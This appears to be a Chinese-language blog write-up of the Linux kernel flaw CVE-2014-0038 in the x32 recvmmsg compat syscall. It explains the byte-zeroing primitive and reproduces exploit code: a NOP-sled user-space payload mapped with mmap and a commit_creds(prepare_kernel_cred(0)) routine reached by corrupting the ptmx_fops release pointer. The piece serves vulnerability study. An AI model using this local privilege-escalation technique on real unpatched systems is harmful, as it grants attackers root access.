+++
title = "CVE-2014-0038"
date = "2014-04-16"
tags = ["socket", "security", "networking"]
+++

利用漏洞将 ``ptmx_fops`` 返回函数的高字节置零，让它指向payload。然后payload在被kernel执行，调用 ``commit_cred`` 获取root。

# Vulnerability

```c
asmlinkage long compat_sys_recvmmsg(int fd, struct compat_mmsghdr __user *mmsg, unsigned int vlen, unsigned int flags, struct compat_timespec __user *timeout)
{
  int datagrams;
  struct timespec ktspec;
  
  if (flags & MSG_CMSG_COMPAT)
    return -EINVAL;
  
  if (COMPAT_USE_64BIT_TIME)
    return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
      flags | MSG_CMSG_COMPAT,
      (struct timespec *) timeout);
  ...
```
        
``timeout`` 是从userland传过来的指针，随后被直接（只做了cast ``(struct timespec *) timeout`` ）传给系统调用 ``__sys_recvmmsg`` 。

- Why ``CONFIG_X86_X32`` is mandatory?


```c
struct timespec {
  __kernel_time_t tv_sec;     /* seconds */
  long    tv_nsec;    /* nanoseconds */
};
typedef __kernel_long_t __kernel_time_t;
```

``__sys_recvmmsg`` 中有两处修改了 ``void *timeout`` .

- 读取 ``timeout``

```c
if (timeout && 
        poll_select_set_timeout(&end_time, timeout->tv_sec,
          timeout->tv_nsec))  // READ ONLY, end_time = timeout
  return -EINVAL;
```
- 更新 ``timeout``

```c
if (timeout) {
  ktime_get_ts(timeout);                         // get now
  *timeout = timespec_sub(end_time, *timeout);   // A - B
  if (timeout->tv_sec < 0) {                     // if timeout really happens
    timeout->tv_sec = timeout->tv_nsec = 0;
    break;                                     // return
  }

  /* Timeout, return less than vlen datagrams */
  if (timeout->tv_nsec == 0 && timeout->tv_sec == 0)
    break;
}
```

所以返回前将 ``timeout->tv_sec = timeout->tv_nsec = 0;``

## 清除一个字节的过程

1. 主进程 ``retval = syscall(__NR_recvmmsg, sockfd, &msgs, 1, 0, (void*)addr)``; 其中 ``addr & 0xFF == 0xFF``
2. 子进程 ``sleep(254)`` 然后 sendto
3. 因为父进程调用 ``recv`` 长达254s之后子进程才发送，所以父进程的调用 ``__NR_recvmmsg`` 会超时
4. 超时发生时，``addr`` 被写 ``0``，然后返回。

# 获取root

- 利用了 ``ptmx_fops`` 的release function指针（在non initialized (and thus writable) kernel memory中） 
- 将指针的高3字节置0，使之指向用户空间中的payload
- Open ``/dev/ptmx``, close it and enjoy.

## payload构造


```c
// code 是payload地址
code = (long)mmap((void*)(TTY_RELEASE & 0x000000fffffff000LL), PAYLOADSIZE, 7, 0x32, 0, 0);
// 0x90 技法
memset((void*)code, 0x90, PAYLOADSIZE);
code += PAYLOADSIZE - 1024;
memcpy((void*)code, &kernel_payload, 1024);

// payload 构造
#define COMMIT_CREDS        0xffffffff8108ad40LL
typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

kernel_payload(void* foo, void* bar)
{
    _commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
    _prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;

    /* restore function pointer and following two longs */
    *((int*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + 4)) = -1;
    *((long*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + 8)) = 0;
    *((long*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + 16)) = 0;

    /* escalate to root */
    commit_creds(prepare_kernel_cred(0));

    return -1;
}
```
    
# 疑问

1. 为什么 ``zero_out`` 只置零1个字节，而不是一个 ``long`` (16 bytes)？
